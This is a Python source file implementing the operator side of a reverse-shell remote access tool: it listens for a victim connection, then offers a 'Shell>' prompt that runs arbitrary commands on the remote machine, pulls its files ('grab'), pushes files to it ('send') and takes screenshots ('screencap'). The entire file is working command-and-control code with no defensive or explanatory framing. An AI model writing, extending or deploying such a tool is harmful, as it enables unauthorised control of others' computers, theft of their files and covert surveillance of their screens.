# Created by Louis Kraimer

import socket
import os

def doGrab(connection, userinput, operation):
    try:
        connection.send(userinput.encode())  # Send command to client
        if operation == "grab":
            parts = userinput.split("*")
            if len(parts) < 2:
                print("[-] Invalid grab command format")
                return
            grab, sourcePathAsFileName = parts
            path = "/home/lkraimer/Desktop/GrabbedFiles/"  # Changed to your username
            os.makedirs(path, exist_ok=True)  # Ensure the directory exists
            fileName = "grabbed_" + os.path.basename(sourcePathAsFileName)

            file_path = os.path.join(path, fileName)
            with open(file_path, 'wb') as f:  # Changed to 'wb' instead of 'ab'
                while True:
                    bits = connection.recv(1024)
                    if not bits:
                        break
                    if bits.endswith(b'DONE'):
                        f.write(bits[:-4])
                        print('[+] Transfer completed')
                        break
                    if b'File not found' in bits:
                        print('[-] Unable to find the file')
                        return
                    f.write(bits)

            print(f"File saved as: {fileName}")
            print(f"Location: {path}")

    except Exception as e:
        print(f"[-] Error in file transfer: {e}")


def doSend(connection, sourcePath, destinationPath, fileName):
    try:
        # Build the full file path (safely joins even if / or \ is missing)
        full_path = os.path.join(sourcePath, fileName)
        print(f"[~] Looking for file: {full_path}")

        # Check if file exists
        if not os.path.exists(full_path):
            connection.send(b"File not found")
            print(f"[-] File does not exist: {full_path}")
            return

        # Check if file is empty
        if os.path.getsize(full_path) == 0:
            connection.send(b"File is empty")
            print(f"[-] File is empty: {full_path}")
            return

        # Send file data
        with open(full_path, 'rb') as sourceFile:
            # Send data in chunks
            bytes_sent = 0
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                connection.send(packet)
                bytes_sent += len(packet)

            # Send completion marker
            connection.send(b'DONE')
            print(f"[+] Transfer Completed - {bytes_sent} bytes sent")

    except Exception as e:
        connection.send(b"File transfer error")
        print(f"[-] Error during file send: {str(e)}")

def transfer(conn, command, operation):
    conn.send(command.encode())
    if operation == "grab":
        grab, path = command.split("*")
        f = open('/home/lkraimer/Desktop' + path, 'wb')
    if operation == "screencap":
        filename = "screencap.jpg"
        f = open('/home/lkraimer/Desktop/' + filename, 'wb')
    while True:
        bits = conn.recv(5000)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('!SUCCESS!: Transfer completed')
            break
        if 'File not found'.encode() in bits:
            print('!ERR!: Unable to find out the file')
            break
        f.write(bits)
    print("!SUCCESS!: File written to: /home/lkraimer/Desktop")

def connecting():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ip = input("Please enter the server IP: ")
    port = int(input("Please enter the port to bind to: "))
    s.bind((ip, port))
    print("Waiting for a connection... *cue jeopardy theme*")
    s.listen(1)
    connection, address = s.accept()
    print("We're In! :) Connection established at", address)

    while True:
        command = input("Shell> ")

        if not command:
            continue

        if "seeya" in command:
            connection.send("seeya".encode())
            connection.close()
            break

        elif command.startswith("grab"):
            doGrab(connection, command, "grab")

        elif command.startswith('send'):
            try:
                parts = command.split("*")

                if len(parts) == 3:
                    # Standard format: send*destination*filename
                    sendCmd, destination, fileName = parts
                elif len(parts) == 2:
                    # Alternative format: send*filename (use empty destination)
                    sendCmd, fileName = parts
                    destination = ""
                else:
                    print("[-] Invalid send command format. Use: send*destination*filename or send*filename")
                    continue

                source = input("Source path: ")
                # Send the full command to the client
                full_command = f"{sendCmd}*{destination}*{fileName}"
                connection.send(full_command.encode())
                print(f"[+] Sending command: {full_command}")

                # Now send the actual file
                doSend(connection, source, destination, fileName)

            except Exception as e:
                print(f"[-] Error processing send command: {e}")

        elif 'screencap' in command:
            transfer(connection, command, "screencap")

        else:
            connection.send(command.encode())
            try:
                response = connection.recv(5000)
                if response:
                    print(response.decode(errors='ignore'))
                else:
                    print("[-] No response received")
            except Exception as e:
                print(f"[-] Error receiving response: {e}")


def main():
    connecting()


if __name__ == "__main__":
    main()